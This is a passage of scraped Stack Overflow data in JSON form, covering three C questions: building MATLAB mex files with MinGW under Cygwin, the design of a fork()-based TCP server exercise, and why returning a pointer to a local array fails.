Microsoft Visual C++ 2010 Express in C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\ \n\n[0] None \n\nCompiler: 1\n\nPlease verify your choices: \n\nCompiler: Microsoft Visual C++ 2010 Express  \nLocation: C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\ \n\nAre these correct [y]/n? y\n\n***************************************************************************** \n  Error: Microsoft Visual C++ 2010 Express requires the Microsoft Windows \n         Software Development Kit (SDK), but the SDK cannot be found.  \n         For more information about the required SDK, see:  \n         http://www.mathworks.com/support/compilers/R2011a/win64.html \n***************************************************************************** \n\n??? Error using ==&gt; mex at 208\nUnable to complete successfully.\n</code></pre>\n\n<h1>Cygwin Follow-Up</h1>\n\n<p>I changed the compiler but now there is an undefined reference to 'WinMain.'</p>\n\n<pre><code>$ make\nx86_64-w64-mingw32-gcc -Wall -m64 -O3 -Iinclude -I/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include gopenfunction.c -Llib -L/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64 -L/cygdrive/c/Progra~1/MATLAB/R2011a/extern/lib/win64/microsoft -lmex -lmx -lmwlapack -lmwblas -leng -o gopenfunction.exe -ladvapi32 -luser32 -lgdi32 -lkernel32 -lmingwex -o gopenfunction.exe\n/usr/x86_64-w64-mingw32/sys-root/mingw/lib/../lib/libmingw32.a(lib64_libmingw32_a-crt0_c.o): In function `main':\n/usr/src/debug/mingw64-x86_64-runtime-4.0.2-1/crt/crt0_c.c:18: undefined reference to `WinMain'\ncollect2: error: ld returned 1 exit status\nMakefile:18: recipe for target 'gopenfunction.exe' failed\nmake: *** [gopenfunction.exe] Error 1\n</code></pre>\n\n<p>edit - using the second method, I was able to compile using the new x86_64 compiler.</p>\n\n<pre><code>x86_64-w64-mingw32-gcc -m64 -shared -Iinclude -I\"/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include\" -DMATLAB_MEX_FILE -o bla.mexw64 -Wl,--export-all-symbols *.c -L\"/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64\" -lmex -lmx -leng -lmat\n</code></pre>\n\n<p>edit2 - after investigating, the absence of <code>-shared</code> option is what causes the 'WinMain' error. I would really appreciate an explanation. I don't know anything about dlls, import libraries, shared libraries, etc, except that they are used at runtime. On the whole my problem has been solved and I thank everyone for their help.</p>\n\n<pre><code>$ x86_64-w64-mingw32-gcc -m64 -shared -Iinclude -I\"/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include\" -o bla.mexw64 *.c -L\"/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64\" -lmex -lmx -leng -lmat\n\n$ x86_64-w64-mingw32-gcc -m64 -Iinclude -I\"/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include\" -o bla.mexw64 *.c -L\"/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64\" -lmex -lmx -leng -lmat\n/usr/x86_64-w64-mingw32/sys-root/mingw/lib/../lib/libmingw32.a(lib64_libmingw32_a-crt0_c.o): In function `main':\n/usr/src/debug/mingw64-x86_64-runtime-4.0.2-1/crt/crt0_c.c:18: undefined reference to `WinMain'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n\n<p>edit3 - looking at the original makefile in the question linked at the start, all of the above is already there under the $(MEXTGT) target. I just didn't understand how that would be called or used so I foolishly deleted it.</p>\n"}, {"tags": ["c", "sockets", "epoll"], "comments": [{"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 1, "creation_date": 1437599707, "post_id": 31574092, "comment_id": 51103116, "body": "code reviews should go on <a href=\"http://codereview.stackexchange.com\">codereview.stackexchange.com</a>."}, {"owner": {"reputation": 72, "user_id": 2124310, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/4a3a88306c7fab9c6835604c27802d62?s=128&d=identicon&r=PG", "display_name": "LuigiDB", "link": "https://stackoverflow.com/users/2124310/luigidb"}, "reply_to_user": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1437599784, "post_id": 31574092, "comment_id": 51103165, "body": "Ok, Sorry i always used stackoverflow."}, {"owner": {"reputation": 6639, "user_id": 1157100, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/1f9W9.png?s=128&g=1", "display_name": "200_success", "link": "https://stackoverflow.com/users/1157100/200-success"}, "reply_to_user": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 2, "creation_date": 1437599839, "post_id": 31574092, "comment_id": 51103195, "body": "@MarcB <a href=\"http://meta.codereview.stackexchange.com/q/5777/9357\">Code Review doesn&#39;t accept pseudocode for review, nor does it allow <code>&#47;* do stuff *&#47;</code> placeholders.</a>"}, {"owner": {"reputation": 72, "user_id": 2124310, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/4a3a88306c7fab9c6835604c27802d62?s=128&d=identicon&r=PG", "display_name": "LuigiDB", "link": "https://stackoverflow.com/users/2124310/luigidb"}, "edited": false, "score": 1, "creation_date": 1437600510, "post_id": 31574092, "comment_id": 51103535, "body": "I&#39;m a little bit confused. codereview only wants &quot;stub code&quot; free question and since i want some advice on the solution stackoverflow seems the most appropriate place. I only want to understand if my solution hold or it&#39;s wrong and possibly some hint on a better solution."}, {"owner": {"reputation": 6639, "user_id": 1157100, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/1f9W9.png?s=128&g=1", "display_name": "200_success", "link": "https://stackoverflow.com/users/1157100/200-success"}, "edited": false, "score": 1, "creation_date": 1437600918, "post_id": 31574092, "comment_id": 51103730, "body": "The question, as it stands, is too open-ended for Stack Overflow (what exactly is your concern?). It&#39;s also too unfinished for Code Review. That means that you don&#39;t really have a good question for either site. You can either add a specific question for Stack Overflow, or finish implementing it and ask on Code Review instead."}, {"owner": {"reputation": 72, "user_id": 2124310, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/4a3a88306c7fab9c6835604c27802d62?s=128&d=identicon&r=PG", "display_name": "LuigiDB", "link": "https://stackoverflow.com/users/2124310/luigidb"}, "edited": false, "score": 0, "creation_date": 1437601137, "post_id": 31574092, "comment_id": 51103838, "body": "The question is: for a server with these constraints is correct to use a poll() instead of a select()? And there is a better way to handle the continuosly call to the fork() primitive?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1437604850, "post_id": 31574092, "comment_id": 51105382, "body": "Please put relevant question updates in the main question body, not in the comments."}], "answers": [{"tags": [], "owner": {"reputation": 2470, "user_id": 1905854, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/a1fc2596592b749bdc2a520ab5118c92?s=128&d=identicon&r=PG", "display_name": "B. Nadolson", "link": "https://stackoverflow.com/users/1905854/b-nadolson"}, "is_accepted": false, "score": 0, "last_activity_date": 1437610676, "creation_date": 1437610676, "answer_id": 31576132, "question_id": 31574092, "link": "https://stackoverflow.com/questions/31574092/c-server-excercise-based-on-fork/31576132#31576132", "title": "c server excercise based on fork()", "body": "<p>If you want to see a simple, yet fully effective example of a server using fork, I would recommend you review this simple little project:</p>\n\n<p><a href=\"ftp://ftp.cs.umass.edu/pub/net/pub/kurose/ftpserver.c\" rel=\"nofollow\">ftp://ftp.cs.umass.edu/pub/net/pub/kurose/ftpserver.c</a></p>\n\n<pre><code>   if (listen(sockid,5) &lt; 0)\n     { printf(\"server: listen error :%d\\n\",errno);exit(0);}                                        \n\n   while(1==1) { \n     /* ACCEPT A CONNECTION AND THEN CREATE A CHILD TO DO THE WORK */\n     /* LOOP BACK AND WAIT FOR ANOTHER CONNECTION                  */\n     printf(\"server: starting accept\\n\");\n     if ((newsd = accept(sockid ,(struct sockaddr *) &amp;client_addr,\n                                      &amp;clilen)) &lt; 0)\n        {printf(\"server: accept  error :%d\\n\", errno); exit(0); }\n        printf(\"server: return from accept, socket for this ftp: %d\\n\",\n                                       newsd);\n     if ( (pid=fork()) == 0) {\n         /* CHILD PROC STARTS HERE. IT WILL DO ACTUAL FILE TRANSFER */\n         close(sockid);   /* child shouldn't do an accept */\n         doftp(newsd);\n         close (newsd);\n         exit(0);         /* child all done with work */\n         }\n      /* PARENT CONTINUES BELOW HERE */\n     close(newsd);        /* parent all done with client, only child */\n     }              /* will communicate with that client from now on */\n</code></pre>\n\n<p>Child fork looks like this:</p>\n\n<pre><code>/* CHILD PROCEDURE, WHICH ACTUALLY DOES THE FILE TRANSFER */\ndoftp(int newsd)\n  {       \n    int i,fsize,fd,msg_ok,fail,fail1,req,c,ack;\n    int no_read ,num_blks , num_blks1,num_last_blk,num_last_blk1,tmp;\n    char fname[MAXLINE];\n    char out_buf[MAXSIZE];\n    FILE *fp;\n\n     no_read = 0;\n     num_blks = 0;\n     num_last_blk = 0; \n\n\n     /* START SERVICING THE CLIENT */ \n\n     /* get command code from client.*/\n     /* only one supported command: 100 -  get a file */\n     req = 0;\n     if((readn(newsd,(char *)&amp;req,sizeof(req))) &lt; 0)\n     {printf(\"server: read error %d\\n\",errno);exit(0);}\n     req = ntohs(req);\n     ... \n</code></pre>\n"}], "owner": {"reputation": 72, "user_id": 2124310, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/4a3a88306c7fab9c6835604c27802d62?s=128&d=identicon&r=PG", "display_name": "LuigiDB", "link": "https://stackoverflow.com/users/2124310/luigidb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 544, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1437610676, "creation_date": 1437599614, "question_id": 31574092, "link": "https://stackoverflow.com/questions/31574092/c-server-excercise-based-on-fork", "title": "c server excercise based on fork()", "body": "<p>I have a little doubt with an excercise that i have found to train my ability with sockets.\nThe exercise says:\nWrite pseudocode of a tcp server based on fork()\nConstraints:\n    - Max 20000 simultaneusly active connections; after this limit new connection are dropped\n    - At most 1000 request per client(ip) per hour</p>\n\n<p>I've sketched a solution and i want to know if's it's a good way to go:</p>\n\n<pre><code>struct client{\n    int ip;\n    timestamp to;\n    int n_req;\n    client* next;\n}\n\nvoid serve(int c_fd, int ip, client* list){\n    client* c = find_in_list(list, ip);\n\n    timestamp now = gettimeofday();\n    if(now.tv_sec - c-&gt;to.tv_sec &gt; (60*60)){    \n        // ig one hour is passed is possible to reset counter\n        c-&gt;n_req = 0;\n        c-&gt;to = now;\n    }\n    if(c-&gt;n_req &gt; 1000){\n        /*do_nothing    */\n    } else {\n        n_req++;\n        /*\n        do stuff\n        */\n    }\n    exit();\n}\n\nint main(){\n    client* list = NULL;\n\n    a_fd = socket(AF_INET);\n    bind(a_fd);\n    listen(a_fd);\n\n\n    while(1){\n\n        /*inizilize poll*/\n        n_ready = poll();\n\n        if(n_ready &gt; 0){\n\n            for(/*each ready file descriptor*/){\n                c_fd = accept(a_fd, this_sockaddr);\n\n                if(/* if the ip in this_sockaddr is new*/){\n                    client* new = /*create neew client */;\n                    add_list(list, new);\n                }\n\n                if(served &lt;= 20000){\n                    served++;\n\n                    pid = fork();\n                    if(pid == 0 ){  //CHILD\n                        serve(c_fd, ip, list);\n                        close(c_fd)\n                    } else {    //FATHER\n                        close(c_fd);\n                        do{\n                            pid = blocking_wait();\n                            served--;\n                        } while(pid != 0)\n                    }\n                } else {\n                    close(c_fd);\n                }\n            }\n\n        }\n    }\n}\n</code></pre>\n\n<p>Thanks for any advice.</p>\n"}, {"tags": ["c", "pointers", "puts"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1437599842, "post_id": 31574051, "comment_id": 51103197, "body": "Why is nothing output?  You&#39;ve invoked undefined behavior."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1437600006, "post_id": 31574051, "comment_id": 51103298, "body": "An array is <b>not</b> a pointer."}, {"owner": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1437600056, "post_id": 31574051, "comment_id": 51103324, "body": "@Olaf: While this is true, I fail to see how it is relevant here."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "edited": false, "score": 0, "creation_date": 1437600179, "post_id": 31574051, "comment_id": 51103367, "body": "@undur_gongor: OP returns a local array. If <code>msg</code> was a pointer, it would work."}, {"owner": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437600231, "post_id": 31574051, "comment_id": 51103391, "body": "@Olaf: OP returns a pointer. A pointer to a &quot;local&quot; array. But a pointer. You cannot return arrays."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "edited": false, "score": 1, "creation_date": 1437600397, "post_id": 31574051, "comment_id": 51103478, "body": "@undur_gongor: Thank you for the information. I do not talk about the return type, but <code>msg</code>. Try <code>char *msg = &quot;Hello&quot;; return msg;</code>. According to the rest of his question, OP confuses pointer and array: &quot;... that the data for a pointer which passes out of scope ...&quot; Data of a pointer is the address it points to. Data for an array is the contents."}], "answers": [{"comments": [{"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1437599843, "post_id": 31574100, "comment_id": 51103198, "body": "gdb shows that the string is still there and pointed by foo. The problem is not there."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 4, "creation_date": 1437599905, "post_id": 31574100, "comment_id": 51103247, "body": "@Yves: At what point?  The call to puts likely modifies the stack."}, {"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1437599960, "post_id": 31574100, "comment_id": 51103276, "body": "Exactly. Upon return of get_message the message is still there."}, {"owner": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "edited": false, "score": 0, "creation_date": 1437600003, "post_id": 31574100, "comment_id": 51103295, "body": "Yes, and in <code>puts</code> that part of the stack gets overwritten."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1437600017, "post_id": 31574100, "comment_id": 51103302, "body": "@YvesDaoust: Yes, but when puts() tries to <i>access</i> it, the call to puts() has already modified the stack.  The function call return address and possibly parameters (depending on the compiler) will be placed on the stack."}, {"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1437600064, "post_id": 31574100, "comment_id": 51103325, "body": "Your sentence &quot; There is no guarantee at that point of what is in the memory that the pointer returned to foo now points to&quot; isn&#39;t valid. gdb shows that the string is still there (and there&#39;s no reason it would be different)."}, {"owner": {"reputation": 230, "user_id": 1792302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a40f97f46d35e933a4bf42239651a68?s=128&d=identicon&r=PG&f=1", "display_name": "ydobonebi", "link": "https://stackoverflow.com/users/1792302/ydobonebi"}, "edited": false, "score": 0, "creation_date": 1437600351, "post_id": 31574100, "comment_id": 51103452, "body": "I mentioned in my answer, the message would technically still be on the stack, but anything put on teh stack (beyond another function call) would overwrite it. It&#39;s really best not to tempt fate with that."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1437600587, "post_id": 31574100, "comment_id": 51103582, "body": "This discussion of &quot;when is or isn&#39;t the string still present on the stack?&quot; is interesting enough that I&#39;ll touch on it in a new answer."}], "tags": [], "owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "is_accepted": true, "score": 4, "last_activity_date": 1437599872, "last_edit_date": 1437599872, "creation_date": 1437599668, "answer_id": 31574100, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c/31574100#31574100", "title": "Pointer scopes in C", "body": "<p>The variable msg is allocated on the stack of get_message()</p>\n\n<pre><code>char msg [] = \"Aren\u2019t pointers fun?\";\n</code></pre>\n\n<p>Once get_message() returns, the stack for that method is torn down.  There is no guarantee at that point of what is in the memory that the pointer returned to <code>foo</code> now points to.  </p>\n\n<p>When puts() is called, the stack is likely modified, overwriting \"Aren't pointer's fun.\"</p>\n"}, {"tags": [], "owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "is_accepted": false, "score": 1, "last_activity_date": 1437600359, "last_edit_date": 1437600359, "creation_date": 1437599772, "answer_id": 31574124, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c/31574124#31574124", "title": "Pointer scopes in C", "body": "<p>It is likely that calling <code>puts</code> modifies the stack and overwrites the string.</p>\n\n<p>Just returning from <code>get_message</code> leaves the string unchanged, but deallocated, i.e. its memory space is available for reuse.</p>\n"}, {"tags": [], "owner": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "is_accepted": false, "score": 0, "last_activity_date": 1437600191, "last_edit_date": 1437600191, "creation_date": 1437599826, "answer_id": 31574142, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c/31574142#31574142", "title": "Pointer scopes in C", "body": "<p>The lifetime of <code>msg</code> ends when returning from the function <code>get_message</code>. The returned pointer points to the object whose lifetime has ended. </p>\n\n<p>Accessing it yields undefined behaviour. Anything can happen. </p>\n\n<p>In your case, the memory of the former <code>msg</code> seems to be overwritten with 0 already.</p>\n\n<p>And this is not about \"scope\". You can fix your code by making <code>msg</code> <code>static</code>. This does not change the scope but its lifetime (a.k.a. storage duration). </p>\n"}, {"comments": [{"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1437602759, "post_id": 31574167, "comment_id": 51104499, "body": "If you want to declare and return <code>char * message = &quot;I love pointers&quot;</code> you don&#39;t need the <code>static</code>.  What <code>static</code> is good for in this case is making the array return well-defined also: <code>static char message[] = &quot;I love static arrays&quot;</code>."}], "tags": [], "owner": {"reputation": 230, "user_id": 1792302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a40f97f46d35e933a4bf42239651a68?s=128&d=identicon&r=PG&f=1", "display_name": "ydobonebi", "link": "https://stackoverflow.com/users/1792302/ydobonebi"}, "is_accepted": false, "score": 0, "last_activity_date": 1437601010, "last_edit_date": 1437601010, "creation_date": 1437599944, "answer_id": 31574167, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c/31574167#31574167", "title": "Pointer scopes in C", "body": "<p>In your getMessage function, the memory used by your message is on the stack and not on the heap. Its still a pointer, just to a location on the stack. Once the function returns, the stack altered (to get the return ip etc) when means, although the message MIGHT still be in the same location in memory, there is absolutely no guarantee. If anything else puts something on to the stack (such as another function call) then most likely it will be overridden. Your message is gone.</p>\n\n<p>The better approach would be to allocate the memory dynamically with malloc to make certain the string in on the heap (although this leads to the problem of who owns the pointer and is responsible for freeing it.)</p>\n\n<p>If you must do something like this, I have seen it done using static:</p>\n\n<pre><code>static char * message = \"I love static pointers\";\n</code></pre>\n\n<p>Edit: despite mentioning that is MIGHT still be on the stack, NEVER EVER ASSUME it is. Most languages won't even allow this.</p>\n"}, {"tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 1, "last_activity_date": 1437602393, "last_edit_date": 1437602393, "creation_date": 1437601009, "answer_id": 31574435, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c/31574435#31574435", "title": "Pointer scopes in C", "body": "<p>The real question here is not, \"why doesn't it work?\".  The question is, \"Why does the string seem to exist even after the return from <code>get_message</code>, but then still not work?\"</p>\n\n<p>To clarify, let's look at the <code>main</code> function again, with two comments for reference:</p>\n\n<pre><code>int main (void) {\n    char *foo = get_message();\n    /* point A */\n    puts(foo);\n    /* point B */\n    return 0;\n}\n</code></pre>\n\n<p>I just compiled and ran this under gdb.  Indeed, at <code>point A</code>, when I printed out the value of the variable <code>foo</code> in gdb, gdb showed me that it pointed to the string <code>\"Aren\u2019t pointers fun?\"</code>.  But then, <code>puts</code> failed to print that string.  And then, at <code>point B</code>, if I again printed out <code>foo</code> in gdb, it was no longer the string it had been.</p>\n\n<p>The explanation, as several earlier commenters have explained, is that function <code>get_message</code> leaves the string on the stack, where it's not guaranteed to stay for long.  After <code>get_message</code> returns, and before anything else has been called, it's still there.  But when we call <code>puts</code>, and <code>puts</code> begins working, it's using that same portion of the stack for its own local storage, so sometime in there (and before <code>puts</code> manages to actually print the string), the string gets destroyed.</p>\n\n<hr>\n\n<p>In response to the OP's follow-on question: When we had</p>\n\n<pre><code>char *get_message() {\n    char msg [] = \"Aren\u2019t pointers fun?\";\n    return msg ;\n}\n</code></pre>\n\n<p>the string lives in the array <code>msg</code> which is on the stack, and we return a pointer to that array, which doesn't work because the data in the array eventually disappears.  If we change it to</p>\n\n<pre><code>char * msg = \"Aren\u2019t pointers fun?\";\n</code></pre>\n\n<p>(such a tiny-seeming change!), now the string is stored in the program's initialized data segment, and we return a pointer to <em>that</em>, and since it's in the program's initialized data segment, it sticks around essentially forever.  (And yes, the fact that <code>get_message</code> ends up returning a different-looking address is significant, although I wouldn't read too much into whether it's lower or higher.)</p>\n\n<hr>\n\n<p>The bottom line is that arrays and pointers are different.  Hugely hugely different.  The line</p>\n\n<pre><code>char arr[] = \"Hello, world!\";\n</code></pre>\n\n<p>bears almost no relation to the very similar-looking line</p>\n\n<pre><code>char *ptr = \"Hello, world!\";\n</code></pre>\n\n<p>Now, they're the same in that you can do both</p>\n\n<pre><code>printf(\"%s\\n\", arr);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>printf(\"%s\\n\", ptr);\n</code></pre>\n\n<p>But if you try to say</p>\n\n<pre><code>arr = \"Goodbye\";    /* WRONG */\n</code></pre>\n\n<p>you can't, because you can't assign to an array.  If you want a new string here, you have to use <code>strcpy</code>, and you have to make sure that the new string is the same length or shorter:</p>\n\n<pre><code>strcpy(arr, \"Goodbye\");\n</code></pre>\n\n<p>But if you try the <code>strcpy</code> thing with the pointer:</p>\n\n<pre><code>strcpy(ptr, \"Goodbye\");    /* WRONG */\n</code></pre>\n\n<p>now <em>that</em> doesn't work, because the string constant that <code>ptr</code> points is nonwritable.  In the pointer case, you can (and often must) use simple assignment:</p>\n\n<pre><code>ptr = \"Goodbye\";\n</code></pre>\n\n<p>and in this case there's no problem setting it to a longer string, too:</p>\n\n<pre><code>ptr = \"Supercalafragalisticexpialadocious\";\n</code></pre>\n\n<p>Those are the basic differences, but as this question points out, another big difference is that the array <code>arr</code> can't be usefully declared in and returned from a function (unless you make it <code>static</code>), while the pointer <code>ptr</code> can.</p>\n"}], "owner": {"reputation": 1, "user_id": 1898389, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81be4e7b1a63b0cc97f7b976a761547b?s=128&d=identicon&r=PG", "display_name": "BoyX", "link": "https://stackoverflow.com/users/1898389/boyx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 178, "favorite_count": 0, "accepted_answer_id": 31574100, "answer_count": 5, "score": -1, "last_activity_date": 1437602393, "creation_date": 1437599473, "last_edit_date": 1437601061, "question_id": 31574051, "link": "https://stackoverflow.com/questions/31574051/pointer-scopes-in-c", "title": "Pointer scopes in C", "body": "<p>In the following code, the explanation for the failure to print anything is that the pointer returned by get_message() is out of scope:</p>\n\n<pre><code>char *get_message() {\n    char msg [] = \"Aren\u2019t pointers fun?\";\n    return msg ;\n}\n\nint main (void) {\n    char *foo = get_message();\n    puts(foo);\n    return 0;\n}\n</code></pre>\n\n<p>When run in gdb, it turns out that the data at the position of foo is the string \"Aren't pointers fun?\": </p>\n\n<pre><code>Old value = 0x0\nNew value = 0x7fffffffde60 \"Aren\u2019t pointers fun?\"\n</code></pre>\n\n<p>(This seems consistent with answers which states that the data for a pointer which passes out of scope remains in memory), but the documentation for \"puts\" states first data is copied from the address given: presumably 0x7fffffffde60 in this case. </p>\n\n<p>Therefore: why is nothing 